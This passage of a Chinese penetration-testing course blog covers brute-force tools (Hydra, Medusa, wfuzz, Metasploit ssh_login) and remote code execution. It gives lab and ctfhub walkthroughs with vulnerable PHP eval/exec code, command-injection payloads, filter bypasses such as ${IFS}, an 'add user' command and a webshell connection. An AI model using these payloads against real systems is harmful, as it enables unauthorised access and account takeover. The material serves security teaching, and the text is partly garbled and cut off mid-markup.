id="个人用户安全建议"><a href="#个人用户安全建议" class="headerlink" title="个人用户安全建议"></a>个人用户安全建议</h2><ol><li>使用复杂密码 </li><li>不同网站使用不同密码 </li><li>定期修改密码 </li><li>防止被钓鱼</li></ol><h1 id="其他暴力破解工具"><a href="#其他暴力破解工具" class="headerlink" title="其他暴力破解工具"></a>其他暴力破解工具</h1><h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><ol><li>猜参数 </li><li>暴破密码 </li><li>找出网站过滤的参数，比如SQL注入和XSS </li><li>目录扫描 </li><li>压力测试</li></ol><pre class="line-numbers language-none"><code class="language-none">wfuzz -z file,user -z file,pass -d "username=FUZZ&amp;password=FUZ2Z&amp;submit=login"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://192.168.142.1/pikachu/vul/burteforce/bf_form.php">http://192.168.142.1/pikachu/vul/burteforce/bf_form.php</a></p><h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p><p>支持： </p><blockquote><p>Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP- POST, HTTP-PROXY,HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST,HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener,Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin,Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5,SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth,VNC and XMPP</p></blockquote><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-R</td><td>恢复上次中断的会话</td></tr><tr><td>-I</td><td>忽略之前的会话文件</td></tr><tr><td>-S</td><td>SSL连接</td></tr><tr><td>-s</td><td>指定端口</td></tr><tr><td>-l</td><td>用户名字典,-L 来自文件</td></tr><tr><td>-p</td><td>密码字典，-P 来自文件</td></tr><tr><td>-x</td><td>密码生成</td></tr><tr><td>-y</td><td>禁用字符</td></tr><tr><td>-r</td><td>rainy mode</td></tr><tr><td>-e</td><td>循环测试用户名而不是密码</td></tr><tr><td>-C</td><td>当用户名和密码存储到一个文件时使用此参数。注 意，文件(字典)存储的格式必须为 “用户名:密码” 的格式。</td></tr><tr><td>-M</td><td>批量暴破</td></tr><tr><td>-o</td><td>输出的文件名</td></tr><tr><td>-b</td><td>输出格式</td></tr><tr><td>-f</td><td>一旦爆破成功一个就停止爆破</td></tr><tr><td>-t</td><td>指定爆破时的任务数量(可以理解为线程数)，默认 为16</td></tr><tr><td>-T</td><td>总并发数</td></tr><tr><td>-w</td><td>每个线程的连接之间的响应等待时间</td></tr><tr><td>-c</td><td>所有线程单次登录等待时间</td></tr><tr><td>-4/-6</td><td>使用IPv4 / IPv6地址</td></tr><tr><td>-v</td><td>显示爆破的详细信息</td></tr><tr><td>-O</td><td>使用旧的SSL v2或v3版本</td></tr><tr><td>-q</td><td>不打印有关连接错误的消息</td></tr><tr><td>-U</td><td>服务模块使用详细信息</td></tr></tbody></table><h3 id="Hydra-Examples"><a href="#Hydra-Examples" class="headerlink" title="Hydra-Examples"></a>Hydra-Examples</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l user -P passlist.txt ftp://192.168.0.1hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAINhydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5hydra -l admin -p password ftp://[192.168.0.0/24]/hydra -L logins.txt -P pws.txt -M targets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h2><p><a href="http://foofus.net/goons/jmk/medusa/medusa.html">http://foofus.net/goons/jmk/medusa/medusa.html</a></p><p>支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP(AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VN</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-e</td><td>额外的密码检测(n：空密码 s：用户名=密码)</td></tr><tr><td>-M</td><td>指定执行的模块(不带.mod扩展名)</td></tr><tr><td>-m</td><td>指定传递给模块的参数</td></tr><tr><td>-d</td><td>查看支持破解的模块</td></tr><tr><td>-n</td><td>指定非默认的TCP端口</td></tr><tr><td>-s</td><td>启动SSL</td></tr><tr><td>-g</td><td>设置连接超时时间(默认值3)</td></tr><tr><td>-r</td><td>设置重试的次数(默认值3)</td></tr><tr><td>-R</td><td>重试次数</td></tr><tr><td>-c</td><td>验证socket连接是否可用的等待时间</td></tr><tr><td>-t</td><td>设置同时测试的登录总数</td></tr><tr><td>-T</td><td>设置同时测试的主机总数</td></tr><tr><td>-L</td><td>一个线程使用一个用户名</td></tr><tr><td>-f</td><td>在破解得到第一个用户名或密码后停止扫描主机</td></tr><tr><td>-F</td><td>当在任何主机上破解得到第一个用户名或密码后停止扫描</td></tr><tr><td>-b</td><td>不显示软件启动时的版本信息</td></tr><tr><td>-q</td><td>显示模块的使用信息</td></tr><tr><td>-v</td><td>详细等级(0-6)</td></tr><tr><td>-w</td><td>错误调试等级(0-10)</td></tr><tr><td>-V</td><td>显示版本信息</td></tr><tr><td>-Z</td><td>恢复中止的扫描</td></tr></tbody></table><h2 id="msf辅助模块"><a href="#msf辅助模块" class="headerlink" title="msf辅助模块"></a>msf辅助模块</h2><pre class="line-numbers language-none"><code class="language-none">msfconsoleuse auxiliary/scanner/ssh/ssh_loginset RHOSTS 192.168.142.66set PASS_FILE /root/vuln/passset USER_FILE /root/vuln/userexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/17-yuan-cheng-dai-ma-zhi-xing/yuan-cheng-dai-ma-zhi-xing/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/17-yuan-cheng-dai-ma-zhi-xing/yuan-cheng-dai-ma-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>什么是远程代码执行？ </li><li>PHP相关函数 </li><li>靶场案例 </li><li>CTF案例 </li><li>防御措施</li></ol><h1 id="什么是远程代码执行？"><a href="#什么是远程代码执行？" class="headerlink" title="什么是远程代码执行？"></a>什么是远程代码执行？</h1><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p> 远程代码执行：Remote Code Execute </p><p>远程命令执行：Remote Command Execute</p><h2 id="为什么要远程执行代码？"><a href="#为什么要远程执行代码？" class="headerlink" title="为什么要远程执行代码？"></a>为什么要远程执行代码？</h2><ul><li>路由器、防火墙、入侵检测等设备的web管理界面 </li><li>自动化运维的管理系统</li></ul><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul><li>获取服务器权限</li><li>获取敏感数据文件</li><li>写入恶意文件getshell </li><li>植入木马病毒勒索软</li></ul><h2 id="实际漏洞"><a href="#实际漏洞" class="headerlink" title="实际漏洞"></a>实际漏洞</h2><ul><li><p>CVE-2021-3177 :Python RCE漏洞 </p></li><li><p>CVE-2021-21972 :VMWare RCE漏洞 </p></li><li><p>CVE-2021-25646 :Apache Druid RCE漏洞 </p></li><li><p>CNVD-2020-46552: 深信服EDR</p></li><li><p>CNVD-2021-30101: 网康下一代防火墙 </p></li><li><p><a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyw">http://cve.mitre.org/cgi-bin/cvekey.cgi?keyw</a></p></li></ul><h1 id="PHP-RCE涉及函数"><a href="#PHP-RCE涉及函数" class="headerlink" title="PHP RCE涉及函数"></a>PHP RCE涉及函数</h1><h2 id="命令command注入"><a href="#命令command注入" class="headerlink" title="命令command注入"></a>命令command注入</h2><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>system()</td><td>执行外部程序，并且显示输出</td></tr><tr><td>exec()/shell_exec()</td><td>通过 shell 环境执行命令，并且将完整的 输出以字符串的方式返回</td></tr><tr><td>pcntl_exec()</td><td>在当前进程空间执行指定程序</td></tr><tr><td>passthru()</td><td>执行外部程序并且显示原始输出</td></tr><tr><td>popen()</td><td>打开进程文件指针</td></tr><tr><td>proc_open()</td><td>执行一个命令，并且打开用来输入/输出 的文件指针</td></tr></tbody></table><h2 id="代码code注入"><a href="#代码code注入" class="headerlink" title="代码code注入"></a>代码code注入</h2><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>eval()</td><td>把字符串 code 作为PHP代码执行</td></tr><tr><td>assert()</td><td>检查一个断言是否为 false</td></tr><tr><td>preg_replace()</td><td>执行一个正则表达式的搜索和替换</td></tr><tr><td>create_function()</td><td>创建一个匿名函数并且返回函数名称</td></tr><tr><td>call_user_func()/ca ll_user_func_array()</td><td>把第一个参数作为回调函数调用</td></tr><tr><td>usort()/uasort()</td><td>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</td></tr></tbody></table><h1 id="靶场案例"><a href="#靶场案例" class="headerlink" title="靶场案例"></a>靶场案例</h1><h3 id="Windows命令拼接符号"><a href="#Windows命令拼接符号" class="headerlink" title="Windows命令拼接符号"></a>Windows命令拼接符号</h3><table><thead><tr><th>符号</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td><code>&amp;&amp;</code></td><td>左边的命令执行<strong>成功</strong>，<strong>右边的才执行</strong></td><td>ping 127.0.0.1 &amp;&amp; echo ‘hello’</td></tr><tr><td><code>&amp;</code></td><td>简单的拼接</td><td>ping 1111 &amp; echo ‘hello’</td></tr><tr><td>`</td><td>`</td><td>上一条命令的<strong>输出</strong>，<strong>作为</strong>下一条命令<strong>参数</strong></td></tr><tr><td>`</td><td></td><td>`</td></tr></tbody></table><h3 id="Linux命令拼接符号"><a href="#Linux命令拼接符号" class="headerlink" title="Linux命令拼接符号"></a>Linux命令拼接符号</h3><table><thead><tr><th>符号</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td><code>; </code></td><td>没有任何逻辑关系的连接符</td><td></td></tr><tr><td><code>&amp;&amp;</code></td><td>左边的命令执行成功，右边的才执行</td><td><code>cp 1.txt 2.txt &amp;&amp; cat 2.txt</code></td></tr><tr><td>`</td><td>`</td><td>上一条命令的输出，作为下一条命令参数</td></tr><tr><td>`</td><td></td><td>`</td></tr><tr><td><code>&amp;</code></td><td><strong>任务后台执行</strong>，与1nohup命令功能差不多</td><td><code>java -jar test.jar &gt; log.txt &amp;</code></td></tr></tbody></table><h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>payload </p><p><code>127.0.0.1 &amp; ipconfig</code> </p><p><img src="/assets/image-20221126141342605.png" alt="image-20221126141342605"></p><p><code>127.0.0.1 &amp; whoami</code> </p><p><img src="/assets/image-20221126141305745.png" alt="image-20221126141305745"></p><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>payload </p><p><code>system('ipconfig');</code></p><p><code>phpinfo();</code> </p><p><img src="/assets/image-20221126142137870.png" alt="image-20221126142137870"></p><p>POST请求，参数为txt，可以用中国蚁剑连接</p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>payload </p><p><code>127.0.0.1 &amp; ipconfig</code> </p><p><img src="/assets/image-20221126142358248.png" alt="image-20221126142358248"></p><p>添加用户：<code>127.0.0.1 &amp; net user hacker /add</code></p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="ctfhub-Web-RCE"><a href="#ctfhub-Web-RCE" class="headerlink" title="ctfhub-Web-RCE"></a>ctfhub-Web-RCE</h2><h3 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h3><p><a href="http://challenge-2b80a00426eb8855.sandbox.ctfhub.com:10800/">http://challenge-2b80a00426eb8855.sandbox.ctfhub.com:10800/</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>中国蚁剑连接</p><p>密码cmd </p><p><img src="/assets/image-20221126143055756.png" alt="image-20221126143055756"></p><p><code>cd /</code> </p><p><code>ls /</code> </p><p><code>cat flag_15855</code></p><pre class="line-numbers language-none"><code class="language-none">(www-data:/var/www/html) $ cd /(www-data:/) $ ls /binbootdevetcflag_15855homeliblib64mediamntoptprocrootrunsbinsrvsystmpusrvar(www-data:/) $ cat flag_15855ctfhub{d0a29cd09905f7a256b40397}(www-data:/) $ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ctfhub{d0a29cd09905f7a256b40397}</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><a href="http://challenge-cc121c7aa36e8824.sandbox.ctfhub.com:10800/">http://challenge-cc121c7aa36e8824.sandbox.ctfhub.com:10800/</a></p><p>代码审计 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload <code>127.0.0.1;ls</code> </p><p><img src="/assets/image-20221126143931523.png" alt="image-20221126143931523"></p><p>payload <code>127.0.0.1;cat 2979093065320.php | base64</code> </p><pre class="line-numbers language-none"><code class="language-none">PD9waHAgLy8gY3RmaHViezE4YTExNDI0ODgzMGI2NTAyODE1ZTZjMn0K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解密得到flag </p><p>base64在线解码：<a href="https://base64.us/">https://base64.us</a></p><p><img src="/assets/image-20221126144144312.png" alt="image-20221126144144312"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php // ctfhub{18a114248830b6502815e6c2}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ctfhub{18a114248830b6502815e6c2}</p><h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h3><p><a href="http://challenge-8786d66d4a937dc7.sandbox.ctfhub.com:10800/">http://challenge-8786d66d4a937dc7.sandbox.ctfhub.com:10800</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$ip</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload <code>127.0.0.1;ls</code> </p><p><img src="/assets/image-20221126144932742.png" alt="image-20221126144932742"></p><p>payload <code>127.0.0.1;less flag_28644136379345.php | base64</code> </p><pre class="line-numbers language-none"><code class="language-none">PD9waHAgLy8gY3RmaHVie2U3NmI0NjNjZTM1NWM0MzVkZDA2NzY2Yn0K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解密得到flag </p><p><img src="/assets/image-20221126145140705.png" alt="image-20221126145140705"></p><!--?php // ctfhub{e76b463ce355c435dd06766b}ctfhub{e76b463ce355c435dd06766b}#### 其他查看命令- cat 由第一行开始显示内容，并将所有内容输出 - tac 从最后一行倒序显示内容，并将所有内容输出 - more 根据窗口大小，一页一页的现实文件内容 - less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 - head 只显示头几行 - tail 只显示最后几行 - nl 类似于cat -n，显示时输出行号 - tailf 类似于tail -f ### 过滤空格http://challenge-bce621b21462003c.sandbox.ctfhub.com:10800<pre class="line-numbers language-php" data-language="php"--><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$ip</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code>payload `127.0.0.1;ls` ![image-20221126145515732](assets/image-20221126145515732.png)payload `127.0.0.1;cat${IFS}flag_182562319323842.php|base64`<pre class="line-numbers language-none"><code class="language-none">PD9waHAgLy8gY3RmaHVie2UwNmE1ZDliZjE5Y2JlOTU3YjJhOWIzOH0K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>base64解密得到flag <!--?php // ctfhub{e06a5d9bf19cbe957b2a9b38}ctfhub{e06a5d9bf19cbe957b2a9b38}#### 其他替换空格使用`IFS$9、%09、<、-->、&lt;&gt;、{,}、%20、${ IFS}、${IFS}`来代替空格 ### 过滤目录分隔符/http://challenge-35a23d8d4560e5f2.sandbox.ctfhub.com:10800<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\//"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$ip</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>payload `127.0.0.1;ls` <pre class="line-numbers language-none"><code class="language-none">Array(    [0] =&gt; PING 127.0.0.1 (127.0.0.1): 56 data bytes    [1] =&gt; 64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.065 ms    [2] =&gt; 64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.056 ms    [3] =&gt; 64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.075 ms    [4] =&gt; 64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.067 ms    [5] =&gt;     [6] =&gt; --- 127.0.0.1 ping statistics ---    [7] =&gt; 4 packets transmitted, 4 packets received, 0% packet loss    [8] =&gt; round-trip min/avg/max = 0.056/0.065/0.075 ms    [9] =&gt; flag_is_here    [10] =&gt; index.php)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>payload `127.0.0.1&amp;ls flag_is_here` <pre class="line-numbers language-none"><code class="language-none">flag_238061868711362.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>payload`127.0.0.1&amp;cd flag_is_here;cat flag_238061868711362.php` 右键查看源代码![image-20221126150922089](assets/image-20221126150922089.png)<!--?php // ctfhub{66f1230febd28ac4c710bf12}ctfhub{66f1230febd28ac4c710bf12}#### 小结使用`;`或者`%0a`代替目录分隔符`/` ### 过滤运算符http://challenge-375f72ef3aee34d3.sandbox.ctfhub.com:10800<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/(\||\&amp;)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ping -c 4 <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>payload `127.0.0.1;ls`<pre class="line-numbers language-none"><code class="language-none">[9] &#x3D;&gt; flag_125721169614234.php[10] &#x3D;&gt; index.php<span aria-hidden="true" 